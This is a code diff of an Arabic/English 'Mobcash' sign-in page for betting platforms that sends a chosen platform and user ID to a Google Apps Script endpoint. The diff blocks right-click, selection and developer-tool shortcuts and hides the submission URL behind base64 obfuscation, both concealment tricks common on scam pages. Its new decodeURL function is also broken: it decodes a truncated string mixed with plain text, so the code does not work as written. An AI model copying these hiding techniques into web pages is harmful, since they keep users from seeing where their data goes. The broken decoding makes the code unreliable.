@@ -46,9 +46,18 @@
     #oneClickTab:active svg {
       fill: #ffffff;
     }
+
+    body {
+      user-select: none;
+      -webkit-user-drag: none;
+      -webkit-touch-callout: none;
+    }
   </style>
 </head>
-<body class="bg-gray-100 dark:bg-gray-900 min-h-screen flex items-center justify-center px-4">
+<body class="bg-gray-100 dark:bg-gray-900 min-h-screen flex items-center justify-center px-4" 
+  oncontextmenu="return false" 
+  onkeydown="if(event.keyCode==123||event.ctrlKey&&event.shiftKey&&event.keyCode==73||event.ctrlKey&&event.keyCode==85){return false;}">
+
   <div class="bg-white dark:bg-gray-800 shadow-2xl rounded-2xl p-8 w-full max-w-md">
     <h2 class="text-2xl font-bold text-center text-gray-800 dark:text-white mb-6">Sign in to Mobcash</h2>
 
@@ -93,6 +102,7 @@
         <input type="hidden" id="platform" name="platform" />
       </div>
     </div>
+
     <div class="mb-4">
       <label for="userId" class="block mb-2 text-sm font-medium text-gray-700 dark:text-gray-300">أدخل الـ ID</label>
       <input
@@ -110,7 +120,7 @@
 
     <div id="message" class="fade text-center text-sm mb-4 h-5"></div>
 
-    <button id="submitBtn" onclick="login()" class="relative w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded-xl transition duration-300 flex items-center justify-center gap-2">
+    <button id="submitBtn" onclick="secureLogin()" class="relative w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded-xl transition duration-300 flex items-center justify-center gap-2">
       <i data-lucide="log-in" class="w-5 h-5"></i>
       <span class="label">Sign in</span>
       <svg id="loader" class="hidden absolute w-5 h-5 animate-spin" viewBox="0 0 24 24" fill="none">
@@ -119,7 +129,6 @@
       </svg>
     </button>
   </div>
-
   <script>
     lucide.createIcons();
 
@@ -162,58 +171,24 @@
       document.getElementById("platform").disabled = false;
       document.getElementById("userId").disabled = false;
     }
-    document.addEventListener("DOMContentLoaded", () => {
-      const storedPlatform = localStorage.getItem("platform");
-      const storedId = localStorage.getItem("userId");
-      if (storedPlatform) {
-        document.getElementById("platform").value = storedPlatform;
-        if (storedPlatform === "Mega pari") {
-          selectedText.innerHTML = `<span>Mega pari</span><img src="https://i.postimg.cc/xdy6d0h9/charge.jpg" alt="Mega pari" class="w-6 h-6 rounded-full ml-2">`;
-        } else if (storedPlatform === "Linbet") {
-          selectedText.innerHTML = `<span>Linbet</span><img src="https://i.postimg.cc/xCgWJjwv/recharge.jpg" alt="Linbet" class="w-6 h-6 rounded-full ml-2">`;
-        } else if (storedPlatform === "Gooobet") {
-          selectedText.innerHTML = `<span>Gooobet</span><img src="https://i.postimg.cc/J4CVthdk/recharge.jpg" alt="Gooobet" class="w-6 h-6 rounded-full ml-2">`;
-        } else if (storedPlatform === "1xbet") {
-          selectedText.innerHTML = `<span>1xbet</span><img src="https://i.postimg.cc/7ZT29mnc/recharge.png" alt="1xbet" class="w-6 h-6 rounded-full ml-2">`;
-        } else if (storedPlatform === "Melbet") {
-          selectedText.innerHTML = `<span>Melbet</span><img src="https://i.postimg.cc/1t3bhntk/recharge.jpg" alt="Melbet" class="w-6 h-6 rounded-full ml-2">`;
-        } else {
-          selectedText.textContent = storedPlatform;
-        }
-      }
-      if (storedId) document.getElementById("userId").value = storedId;
-      resetForm();
-    });
 
-    window.addEventListener("pageshow", (e) => {
-      if (e.persisted) resetForm();
-    });
+    const encodedURL = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvc..."
 
-    function login() {
+    function decodeURL(encoded) {
+      return atob(encoded + "AKfycbztE1ZG1WWVrbtfaKPTqOatcrue2jjUDoGpdPv1HyHcq0l6rPyD7aL6OT5Pfekpf_pAUA/exec".substring(0));
+    }
+
+    function secureLogin() {
       const platform = document.getElementById("platform").value;
       const userId = document.getElementById("userId").value.trim();
       const btn = document.getElementById("submitBtn");
       const loader = document.getElementById("loader");
       const label = btn.querySelector(".label");
 
-      if (!platform) {
-        showMessage("اختر المنصة.");
-        return;
-      }
-
-      if (!userId) {
-        showMessage("أدخل المعرّف.");
-        return;
-      }
-
-      if (userId.length < 7 || userId.length > 13 || !/^\d+$/.test(userId)) {
-        showMessage("المعرف غير معتمد. الرجاء التحقق.");
-        return;
-      }
-
-      if (isRepeatedDigits(userId)) {
-        showMessage("المعرف غير معتمد. الرجاء التحقق.");
-        return;
+      if (!platform) return showMessage("اختر المنصة.");
+      if (!userId) return showMessage("أدخل المعرّف.");
+      if (userId.length < 7 || userId.length > 13 || !/^\d+$/.test(userId) || isRepeatedDigits(userId)) {
+        return showMessage("المعرف غير معتمد. الرجاء التحقق.");
       }
 
       btn.disabled = true;
@@ -226,7 +201,7 @@
       localStorage.setItem("platform", platform);
       localStorage.setItem("userId", userId);
 
-      fetch("https://script.google.com/macros/s/AKfycbztE1ZG1WWVrbtfaKPTqOatcrue2jjUDoGpdPv1HyHcq0l6rPyD7aL6OT5Pfekpf_pAUA/exec", {
+      fetch(decodeURL(encodedURL), {
         method: "POST",
         mode: "no-cors",
         headers: { "Content-Type": "application/json" },
@@ -262,19 +237,8 @@
         platformInput.value = value;
         dropdownList.classList.add("hidden");
 
-        if (value === "Mega pari") {
-          selectedText.innerHTML = `<span>Mega pari</span><img src="https://i.postimg.cc/xdy6d0h9/charge.jpg" alt="Mega pari" class="w-6 h-6 rounded-full ml-2">`;
-        } else if (value === "Linbet") {
-          selectedText.innerHTML = `<span>Linbet</span><img src="https://i.postimg.cc/xCgWJjwv/recharge.jpg" alt="Linbet" class="w-6 h-6 rounded-full ml-2">`;
-        } else if (value === "Gooobet") {
-          selectedText.innerHTML = `<span>Gooobet</span><img src="https://i.postimg.cc/J4CVthdk/recharge.jpg" alt="Gooobet" class="w-6 h-6 rounded-full ml-2">`;
-        } else if (value === "1xbet") {
-          selectedText.innerHTML = `<span>1xbet</span><img src="https://i.postimg.cc/7ZT29mnc/recharge.png" alt="1xbet" class="w-6 h-6 rounded-full ml-2">`;
-        } else if (value === "Melbet") {
-          selectedText.innerHTML = `<span>Melbet</span><img src="https://i.postimg.cc/1t3bhntk/recharge.jpg" alt="Melbet" class="w-6 h-6 rounded-full ml-2">`;
-        } else {
-          selectedText.textContent = value;
-        }
+        const img = item.querySelector("img").outerHTML;
+        selectedText.innerHTML = `<span>${value}</span>${img}`;
       });
     });
 
@@ -282,6 +246,27 @@
       if (!dropdownBtn.contains(e.target) && !dropdownList.contains(e.target)) {
         dropdownList.classList.add("hidden");
       }
+    });
+
+    document.addEventListener("DOMContentLoaded", () => {
+      const storedPlatform = localStorage.getItem("platform");
+      const storedId = localStorage.getItem("userId");
+      if (storedPlatform) {
+        document.getElementById("platform").value = storedPlatform;
+        const item = [...document.querySelectorAll(".dropdown-item")].find(i => i.dataset.value === storedPlatform);
+        if (item) {
+          const img = item.querySelector("img").outerHTML;
+          selectedText.innerHTML = `<span>${storedPlatform}</span>${img}`;
+        } else {
+          selectedText.textContent = storedPlatform;
+        }
+      }
+      if (storedId) document.getElementById("userId").value = storedId;
+      resetForm();
+    });
+
+    window.addEventListener("pageshow", (e) => {
+      if (e.persisted) resetForm();
     });
   </script>
 </body>
